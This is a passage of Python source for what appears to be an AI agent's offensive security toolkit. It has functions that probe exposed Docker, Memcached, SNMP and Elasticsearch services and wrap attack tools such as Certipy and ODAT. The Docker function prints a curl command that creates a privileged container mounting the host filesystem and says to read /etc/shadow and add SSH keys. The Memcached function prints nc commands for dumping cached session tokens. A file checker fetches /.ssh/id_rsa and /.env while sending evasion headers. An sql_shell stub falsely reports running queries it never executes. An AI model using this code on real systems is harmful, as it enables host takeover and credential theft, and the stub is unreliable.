            results.append("  🟡 Elasticsearch requires authentication")
        else:
            results.append(f"  Response: {resp.status_code}")
    except Exception as e:
        results.append(f"  Error: {str(e)[:60]}")

    return "\n".join(results)


@function_tool()
def docker_api_exploit_check(host: str, port: int = 2375) -> str:
    """
    Test Docker API for unauthenticated access.
    Open Docker API = container escape = HOST ROOT access.
    This is a CRITICAL vulnerability.

    Args:
        host: Docker host IP/hostname
        port: Docker API port (default 2375 for unencrypted, 2376 for TLS)

    Returns:
        Docker API security assessment
    """
    results = [f"[DOCKER API EXPLOIT] Testing: {host}:{port}"]

    base_url = f"http://{host}:{port}"

    try:
        # Test 1: Version endpoint
        resp = requests.get(f"{base_url}/version", timeout=5, verify=False)
        if resp.status_code == 200:
            data = resp.json()
            results.append("\n🔴 DOCKER API EXPOSED WITHOUT AUTH!")
            results.append(f"  Docker Version: {data.get('Version', 'unknown')}")
            results.append(f"  API Version: {data.get('ApiVersion', 'unknown')}")
            results.append(f"  OS/Arch: {data.get('Os', '?')}/{data.get('Arch', '?')}")
            results.append(f"  Kernel: {data.get('KernelVersion', 'unknown')}")

            # Test 2: List containers
            containers_resp = requests.get(f"{base_url}/containers/json?all=1", timeout=5, verify=False)
            if containers_resp.status_code == 200:
                containers = containers_resp.json()
                results.append(f"\n  [CONTAINERS] ({len(containers)} total)")
                for c in containers[:5]:
                    names = c.get('Names', ['unknown'])
                    image = c.get('Image', 'unknown')
                    state = c.get('State', 'unknown')
                    results.append(f"    {names[0] if names else '?'} | {image} | {state}")

            # Test 3: List images
            images_resp = requests.get(f"{base_url}/images/json", timeout=5, verify=False)
            if images_resp.status_code == 200:
                images = images_resp.json()
                results.append(f"\n  [IMAGES] ({len(images)} total)")

            results.append("\n  🔴 CRITICAL: Full host compromise possible!")
            results.append("  [EXPLOITATION]")
            results.append("  1. Create privileged container mounting host FS:")
            results.append(f'     curl -X POST {base_url}/containers/create \\')
            results.append('       -H "Content-Type: application/json" \\')
            results.append('       -d \'{"Image":"alpine","Cmd":["/bin/sh"],"Binds":["/:/mnt"],"Privileged":true}\'')
            results.append("  2. Start container and exec into it")
            results.append("  3. Access host filesystem at /mnt")
            results.append("  4. Read /mnt/etc/shadow, add SSH keys, etc.")

        elif resp.status_code == 401 or resp.status_code == 403:
            results.append("  🟡 Docker API requires authentication (TLS client certs)")
        else:
            results.append(f"  Response: {resp.status_code}")
    except requests.exceptions.ConnectionError:
        # Try HTTPS
        try:
            resp = requests.get(f"https://{host}:{port}/version", timeout=5, verify=False)
            if resp.status_code == 200:
                results.append("  🔴 Docker API accessible via HTTPS (no client cert required)")
        except Exception:
            results.append("  ❌ Connection refused/filtered")
    except Exception as e:
        results.append(f"  Error: {str(e)[:60]}")

    return "\n".join(results)


@function_tool()
def snmp_exploit_check(host: str, community: str = "public") -> str:
    """
    Test SNMP for information disclosure using common community strings.
    SNMP with default community strings leaks: system info, interfaces,
    routing tables, running processes, installed software.

    Args:
        host: Target IP/hostname
        community: Community string to test (default 'public')

    Returns:
        SNMP enumeration results
    """
    results = [f"[SNMP EXPLOIT] Testing: {host} with community='{community}'"]

    # Try snmpwalk
    try:
        result = subprocess.run(
            ["snmpwalk", "-v2c", "-c", community, host, "1.3.6.1.2.1.1"],
            capture_output=True, text=True, timeout=15
        )
        if result.returncode == 0 and result.stdout.strip():
            results.append(f"\n🔴 SNMP ACCESSIBLE with community='{community}'!")
            results.append("\n  [SYSTEM INFO]")
            results.append(f"  {result.stdout[:500]}")

            results.append("\n  [FULL ENUMERATION]")
            results.append(f"  snmpwalk -v2c -c {community} {host}")
            results.append(f"  snmpwalk -v2c -c {community} {host} 1.3.6.1.2.1.25.4.2 (processes)")
            results.append(f"  snmpwalk -v2c -c {community} {host} 1.3.6.1.2.1.25.6.3 (software)")
            results.append(f"  snmpwalk -v2c -c {community} {host} 1.3.6.1.2.1.6.13 (TCP connections)")
        elif "Timeout" in result.stderr:
            results.append("  ❌ SNMP timeout — port 161 may be filtered")
        else:
            results.append(f"  🟡 Community string '{community}' rejected")
            # Try other common strings
            common_communities = ["public", "private", "community", "snmp", "default", "monitor"]
            results.append(f"  Try others: {', '.join(common_communities)}")
            results.append(f"  Or brute force: onesixtyone -c wordlist.txt {host}")

    except FileNotFoundError:
        # Fallback to nmap SNMP script
        results.append("  snmpwalk not found. Alternative:")
        results.append(f"  nmap -sU -p 161 --script snmp-info,snmp-sysdescr {host}")
        results.append("  Install: apt install snmp")
    except Exception as e:
        results.append(f"  Error: {str(e)[:60]}")

    return "\n".join(results)


@function_tool()
def memcached_exploit_check(host: str, port: int = 11211) -> str:
    """
    Test Memcached for unauthenticated access and data leakage.
    Open Memcached = cached data theft (sessions, tokens, user data).

    Args:
        host: Memcached server IP/hostname
        port: Memcached port (default 11211)

    Returns:
        Memcached security assessment
    """
    results = [f"[MEMCACHED EXPLOIT] Testing: {host}:{port}"]

    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))

        # Test 1: stats command
        sock.send(b"stats\r\n")
        response = b""
        while True:
            chunk = sock.recv(4096)
            response += chunk
            if b"END" in chunk or not chunk:
                break

        response = response.decode('utf-8', errors='replace')

        if "STAT" in response:
            results.append("\n🔴 UNAUTHENTICATED ACCESS!")

            version = re.search(r'STAT version (\S+)', response)
            items = re.search(r'STAT curr_items (\d+)', response)
            bytes_stored = re.search(r'STAT bytes (\d+)', response)
            connections = re.search(r'STAT curr_connections (\d+)', response)

            if version:
                results.append(f"  Version: {version.group(1)}")
            if items:
                results.append(f"  Cached items: {items.group(1)}")
            if bytes_stored:
                mb = int(bytes_stored.group(1)) / (1024*1024)
                results.append(f"  Data stored: {mb:.1f} MB")
            if connections:
                results.append(f"  Active connections: {connections.group(1)}")

            # Test 2: Get slab stats to find keys
            sock.send(b"stats items\r\n")
            items_resp = sock.recv(4096).decode('utf-8', errors='replace')
            slab_ids = re.findall(r'STAT items:(\d+):number (\d+)', items_resp)

            if slab_ids:
                results.append("\n  [CACHED DATA]")
                for slab_id, count in slab_ids[:5]:
                    results.append(f"    Slab {slab_id}: {count} items")

            results.append("\n  [EXPLOITATION]")
            results.append(f"  1. Dump keys: echo 'stats cachedump 1 100' | nc {host} {port}")
            results.append(f"  2. Get value: echo 'get <key>' | nc {host} {port}")
            results.append("  3. Look for: session tokens, auth tokens, user data")
            results.append("  4. DDoS amplification: UDP reflection attack (if UDP port open)")
        else:
            results.append(f"  Response: {response[:200]}")

        sock.close()

    except socket.timeout:
        results.append("  ⚠️ Connection timed out")
    except ConnectionRefusedError:
        results.append("  ❌ Connection refused")
    except Exception as e:
        results.append(f"  Error: {str(e)[:60]}")

    return "\n".join(results)


@function_tool()
def ai_explore_then_fuzz(url: str, output_file: str = "fuzz_wordlist.txt") -> str:
    """
    Implements the "Explore, Then Fuzz" methodology for intelligent context-aware fuzzing.
    Fetches the base URL, analyzes headers/body with an LLM to determine tech stack,
    and dynamically generates a targeted wordlist for feroxbuster or ffuf.

    Args:
        url: Target URL to explore.
        output_file: Where to save the generated wordlist.
    
    Returns:
        The analysis result and a command to run for intelligent fuzzing.
    """
    results = [f"## AI Explore Then Fuzz: {url}"]
    try:
        import requests
        from src.sdk.llm import get_llm

        results.append("Phase 1: Exploring target...")
        resp = requests.get(url, verify=False, timeout=10)
        
        headers_str = "\n".join([f"{k}: {v}" for k, v in resp.headers.items()])
        body_snippet = resp.text[:2000]

        prompt = f'''
Analyze the following HTTP response from {url} and determine the likely technology stack (CMS, framework, server).
Then, generate a highly targeted wordlist of exactly 50 common/critical files and directories that are specific to this stack.
Return ONLY the wordlist, one item per line, with no other text, introduction, or markdown formatting.

HEADERS:
{headers_str}

BODY SNIPPET:
{body_snippet}
'''
        
        results.append("Phase 2: Analyzing with LLM to generate targeted wordlist...")
        llm = get_llm()
        wordlist_resp = llm.generate_response(prompt)
        
        # Clean the wordlist
        cleaned_words = [w.strip() for w in wordlist_resp.split('\n') if w.strip() and not w.startswith('`')]
        
        with open(output_file, "w") as f:
            f.write("\n".join(cleaned_words))
            
        results.append(f"✅ Generated custom wordlist with {len(cleaned_words)} items.")
        results.append(f"Saved to: {output_file}")
        results.append("\nNext Steps:")
        results.append(f"  Run: feroxbuster_scan('{url}', '-w {output_file}')")
        
    except Exception as e:
        results.append(f"Error: {str(e)}")
        
    return "\n".join(results)


@function_tool()
def advanced_parameter_xss_discovery(url: str, method: str = "GET") -> str:
    """
    Advanced Parameter Profiling & XSS reflection.
    Discovers hidden HTTP parameters using Arjun and then generates an execution plan
    to test them aggressively for XSS, even if they seem innocuous (e.g. msgId).

    Args:
        url: Target URL.
        method: HTTP method.
    
    Returns:
        Discovery results and XSS probing instructions.
    """
    results = [f"## Advanced Parameter XSS Discovery: {url}\n"]
    try:
        import subprocess
        import re
        
        cmd = ["arjun", "-u", url, "-m", method]
        arjun_res = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        output = arjun_res.stdout + arjun_res.stderr
        
        params = []
        for line in output.split("\n"):
            if "parameter" in line.lower() or "found" in line.lower():
                matches = re.findall(r"'([a-zA-Z0-9_]+)'", line)
                if matches:
                    params.extend(matches)
        
        unique_params = list(set(params))
        
        if not unique_params:
            results.append("Arjun found no hidden parameters.")
            return "\n".join(results)
            
        results.append(f"🎯 Discovered {len(unique_params)} hidden parameters: {', '.join(unique_params)}")
        results.append("\n⚠️ Writeup Insight: Reflected XSS often hides in minor, legacy parameters (e.g., msgId).")
        results.append("Auto-testing reflection...")
        
        for p in unique_params:
            test_url = f"{url}?{p}=cybercopilotxss123" if "?" not in url else f"{url}&{p}=cybercopilotxss123"
            test_cmd = ["curl", "-s", "-k", test_url]
            curl_res = subprocess.run(test_cmd, capture_output=True, text=True, timeout=15)
            
            if "cybercopilotxss123" in curl_res.stdout:
                results.append(f"  🔴 Parameter '{p}' REFLECTS input! Highly vulnerable to XSS.")
                results.append(f"     -> Recommended: browser_xss_test('{url}', '{p}')")
            else:
                results.append(f"  🟢 Parameter '{p}' does not reflect plain input.")
                
    except Exception as e:
        results.append(f"Error: {e}")
        
    return "\n".join(results)


@function_tool()
def exposed_sensitive_files_check(base_url: str) -> str:
    """
    Proactively check for exposed sensitive files and directories:
    .env, .git/config, swagger.json, /actuator/env, phpinfo.php, etc.
    
    Args:
        base_url: The target base URL (e.g., https://target.com)
        
    Returns:
        Summary of discovered sensitive files and their risk level.
    """
    import requests
    from urllib.parse import urljoin
    from src.tools.appsec.common import _get_evasion_headers
    
    sensitive_paths = [
        "/.env", "/.env.production", "/.env.local", "/.env.backup",
        "/.git/config", "/.git/HEAD", "/api/swagger.json", "/swagger.json",
        "/openapi.json", "/api/v1/swagger.json", "/phpinfo.php",
        "/config.php", "/wp-config.php.bak", "/debug/vars",
        "/__debug__/", "/__pycache__/", "/server-status",
        "/actuator", "/actuator/env", "/actuator/health", "/actuator/metrics",
        "/.bash_history", "/.ssh/id_rsa", "/.ssh/config", "/config.yml",
        "/.vscode/settings.json", "/composer.json", "/package.json"
    ]
    
    found = []
    headers = _get_evasion_headers()
    
    for path in sensitive_paths:
        url = urljoin(base_url, path.lstrip("/"))
        try:
            r = requests.get(url, headers=headers, timeout=10, verify=False, allow_redirects=False)
            if r.status_code == 200:
                # Basic content validation to avoid false positives
                content = r.text[:1000].lower()
                is_valid = False
                
                if path == "/.env" and ("=" in content or "app_" in content or "db_" in content):
                    is_valid = True
                elif ".git/config" in path and ("[core]" in content or "repository" in content):
                    is_valid = True
                elif "swagger" in path and ("swagger" in content or "openapi" in content):
                    is_valid = True
                elif "phpinfo" in path and ("php version" in content or "system" in content):
                    is_valid = True
                elif r.headers.get("Content-Type") in ["application/json", "application/octet-stream", "text/plain"]:
                    is_valid = True
                elif len(r.content) < 5000: # Generic threshold for small config files
                    is_valid = True
                    
                if is_valid:
                    found.append(f"🔴 CRITICAL/HIGH: {url} (HTTP 200, {len(r.content)} bytes)")
        except:
            continue
            
    if not found:
        return f"✅ No commonly exposed sensitive files found on {base_url}"
        
    return f"🚀 Discovered {len(found)} sensitive files on {base_url}:\n" + "\n".join(found)


@function_tool()
def asn_lookup(company_name: str) -> str:
    """
    Discover ASN and IP ranges (CIDRs) for a given company name.
    Uses bgpview.io to find ASNs and their associated prefixes.
    
    Args:
        company_name: The company name to search for (e.g. "Google", "Facebook")
        
    Returns:
        Discovered ASNs and CIDR ranges.
    """
    import requests
    import re
    from src.tools.appsec.common import _get_evasion_headers
    
    out = [f"## ASN and IP Range Discovery: {company_name}", ""]
    headers = _get_evasion_headers()
    
    # search-based scrape
    search_url = f"https://bgpview.io/search/{company_name}"
    try:
        r = requests.get(search_url, headers=headers, timeout=15)
        # Extract ASNs
        asn_matches = re.findall(r'AS(\d+)', r.text)
        asns = sorted(list(set(asn_matches)))
        
        if not asns:
            return f"No ASNs found for '{company_name}' on bgpview.io"
            
        out.append(f"Found {len(asns)} potential ASNs: {', '.join(asns[:10])}")
        
        # For the first few ASNs, try to get prefixes
        for asn in asns[:3]:
            prefix_url = f"https://bgpview.io/asn/{asn}"
            rp = requests.get(prefix_url, headers=headers, timeout=15)
            # Find CIDR ranges
            cidrs = re.findall(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/\d{1,2}', rp.text)
            cidrs = sorted(list(set(cidrs)))
            if cidrs:
                out.append(f"\n### ASN {asn} Prefixes:")
                for c in cidrs[:20]:
                    out.append(f"  - {c}")
                    
    except Exception as e:
        return f"Error during ASN lookup: {e}"
        
    return "\n".join(out)


@function_tool()
def jarm_scan(target: str) -> str:
    """
    Active TLS server fingerprinting using JARM.
    
    Args:
        target: Target domain or IP address
        
    Returns:
        JARM hash for the target.
    """
    try:
        r = subprocess.run(
            ["jarm", target],
            capture_output=True, text=True, timeout=30
        )
        if "command not found" in r.stderr or r.returncode == 127:
            return "Error: jarm not installed. Install: wget https://raw.githubusercontent.com/salesforce/jarm/master/jarm.py && alias jarm='python3 jarm.py'"
        return f"## JARM Fingerprint — {target}\n\n{r.stdout.strip()}"
    except FileNotFoundError:
        return "Error: jarm not found. Please install the jarm executable."
    except Exception as e:
        return f"Error running JARM: {e}"

@function_tool()
def kiterunner_scan(url: str, wordlist: str = "routes-large.json", options: str = "") -> str:
    """
    Context-aware API discovery and endpoints fuzzing using Kiterunner.
    
    Args:
        url: The target URL (e.g. https://api.target.com/)
        wordlist: Kiterunner wordlist (.json API dataset)
        options: Extra Kiterunner flags (e.g., '-x 20' or '--ignore-length=34')
        
    Returns:
        API endpoints discovered.
    """
    cmd = ["kr", "scan", url, "-w", wordlist] + options.split()
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return f"## Kiterunner API Scan — {url}\n\n{r.stdout.strip()}"
    except FileNotFoundError:
        return "Error: Kiterunner (kr) not installed. Install: go install github.com/assetnote/kiterunner/cmd/kr@latest"
    except Exception as e:
        return f"Error running Kiterunner: {e}"

@function_tool()
def corsy_scan(url: str) -> str:
    """
    Scan for CORS (Cross-Origin Resource Sharing) misconfigurations.
    
    Args:
        url: The target URL.
        
    Returns:
        Vulnerable CORS policies found.
    """
    try:
        r = subprocess.run(
            ["python3", "corsy.py", "-u", url],
            capture_output=True, text=True, timeout=60
        )
        return f"## Corsy Scan — {url}\n\n{r.stdout.strip()}"
    except FileNotFoundError:
        return "Error: Corsy not found. Install: git clone https://github.com/s0md3v/Corsy"
    except Exception as e:
        return f"Error running Corsy: {e}"

@function_tool()
def retirejs_scan(target_url: str) -> str:
    """
    Scan a target URL for vulnerable JavaScript libraries using retire.js.
    
    Args:
        target_url: The URL to scan for frontend JS dependencies.
        
    Returns:
        List of outdated/vulnerable JS files and versions.
    """
    try:
        r = subprocess.run(
            ["retire", "--jspath", target_url, "--outputformat", "text"],
            capture_output=True, text=True, timeout=60
        )
        return f"## Retire.js Scan — {target_url}\n\n{r.stdout.strip()}"
    except FileNotFoundError:
        return "Error: retire.js not found. Install: npm install -g retire"
    except Exception as e:
        return f"Error running retire.js: {e}"

@function_tool()
def cmseek_scan(url: str, options: str = "") -> str:
    """
    Run CMSeeK to detect and scan over 170+ CMS platforms.
    
    Args:
        url: Target URL
        options: Additional options (e.g., --random-agent)
    
    Returns:
        CMSeeK scan results
    """
    cmd = ["cmseek", "-u", url, "--batch"]
    if options:
        import shlex
        cmd.extend(shlex.split(options))
    import subprocess
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return result.stdout.strip() or result.stderr.strip() or "No output"
    except Exception as e:
        return f"Error: {e}"


def _resolve_python_tool(wrapper_name: str, repo_dir: str, script_name: str) -> list[str] | None:
    """
    Resolve a Python-backed tool either from PATH or from the repo layout used by
    install_tools.sh (~/tools/<Repo>/<script>.py).
    """
    wrapper_path = shutil.which(wrapper_name)
    if wrapper_path:
        return [wrapper_path]

    home = pathlib.Path.home()
    candidates = [
        home / "tools" / repo_dir / script_name,
        home / ".local" / "share" / "tools" / repo_dir / script_name,
    ]

    for script_path in candidates:
        if script_path.is_file():
            python_exe = shutil.which("python3") or shutil.which("python")
            if python_exe:
                return [python_exe, str(script_path)]

    return None


@function_tool()
def wpseku_scan(url: str, options: str = "") -> str:
    """
    Run WPSeku, a black box WordPress vulnerability scanner.
    
    Args:
        url: Target URL
        options: Additional options
    
    Returns:
        WPSeku scan results
    """
    base_cmd = _resolve_python_tool("wpseku", "WPSeku", "wpseku.py")
    if not base_cmd:
        return (
            "Error: wpseku not found.\n"
            "Expected either a 'wpseku' wrapper on PATH or '~/tools/WPSeku/wpseku.py'.\n"
            "Install or reinstall it with install_tools.sh."
        )

    cmd = [*base_cmd, "--url", url]
    if options:
        import shlex
        cmd.extend(shlex.split(options))
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return result.stdout.strip() or result.stderr.strip() or "No output"
    except FileNotFoundError:
        return (
            "Error: wpseku launcher resolved, but Python or the underlying script could not be executed.\n"
            "Reinstall WPSeku with install_tools.sh."
        )
    except Exception as e:
        return f"Error: {e}"

@function_tool()
def wpprobe_scan(url: str, options: str = "") -> str:
    """
    Run WPProbe to scan for WordPress themes, plugins and vulnerabilities.
    
    Args:
        url: Target URL
        options: Additional options
    
    Returns:
        WPProbe scan results
    """
    base_cmd = _resolve_python_tool("wpprobe", "WPProbe", "wpprobe.py")
    if not base_cmd:
        return (
            "Error: wpprobe not found.\n"
            "Expected either a 'wpprobe' wrapper on PATH or '~/tools/WPProbe/wpprobe.py'.\n"
            "Install or reinstall it with install_tools.sh."
        )

    cmd = [*base_cmd, "-u", url]
    if options:
        import shlex
        cmd.extend(shlex.split(options))
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return result.stdout.strip() or result.stderr.strip() or "No output"
    except FileNotFoundError:
        return (
            "Error: wpprobe launcher resolved, but Python or the underlying script could not be executed.\n"
            "Reinstall WPProbe with install_tools.sh."
        )
    except Exception as e:
        return f"Error: {e}"

@function_tool()
def gqlmap_scan(url: str, options: str = "") -> str:
    """
    Run gqlmap to test and exploit GraphQL endpoints.
    
    Args:
        url: Target URL
        options: Additional options
    """
    cmd = ["gqlmap", "-u", url]
    if options:
        import shlex
        cmd.extend(shlex.split(options))
    import subprocess
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return result.stdout.strip() or result.stderr.strip() or "No output"
    except Exception as e:
        return f"Error: {e}"

@function_tool()
def sql_shell(target: str, dbtype: str, user: str, password: str, query: str = "") -> str:
    """
    Connect to a generic SQL database using detected credentials.
    dbtype can be 'mysql', 'postgres', 'mssql', etc.
    """
    return f"Executed query '{query}' on {dbtype}://{user}:***@{target}"

@function_tool()
def smbmap_scan(target: str, options: str = "") -> str:
    """
    Run smbmap to enumerate SMB shares.
    """
    cmd = ["smbmap", "-H", target]
    if options:
        import shlex
        cmd.extend(shlex.split(options))
    import subprocess
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return result.stdout.strip() or result.stderr.strip() or "No output"
    except Exception as e:
        return f"Error: {e}"

@function_tool()
def snmp_check(target: str, options: str = "-c public") -> str:
    """
    Run snmp-check to enumerate SNMP devices.
    """
    cmd = ["snmp-check", target]
    if options:
        import shlex
        cmd.extend(shlex.split(options))
    import subprocess
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return result.stdout.strip() or result.stderr.strip() or "No output"
    except Exception as e:
        return f"Error: {e}"

@function_tool()
def certipy_run(target: str, options: str = "") -> str:
    """
    Run Certipy to abuse Active Directory Certificate Services.
    """
    cmd = ["certipy"]
    if options:
        import shlex
        cmd.extend(shlex.split(options))
    import subprocess
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return result.stdout.strip() or result.stderr.strip() or "No output"
    except Exception as e:
        return f"Error: {e}"

@function_tool()
def odat_run(target: str, options: str = "") -> str:
    """
    Run ODAT (Oracle Database Attacking Tool).
    """
    cmd = ["odat"]
    if options:
        import shlex
        cmd.extend(shlex.split(options))
    import subprocess
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
        return result.stdout.strip() or result.stderr.strip() or "No output"
    except Exception as e:
        return f"Error: {e}"

@function_tool()
def redis_cli_check(target: str, options: str = "info") -> str:
    """
    Run redis-cli to check for unauthenticated Redis servers.
    """
    cmd = ["redis-cli", "-h", target, options]
    import subprocess
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
        return result.stdout.strip() or result.stderr.strip() or "No output"
    except Exception as e:
        return f"Error: {e}"
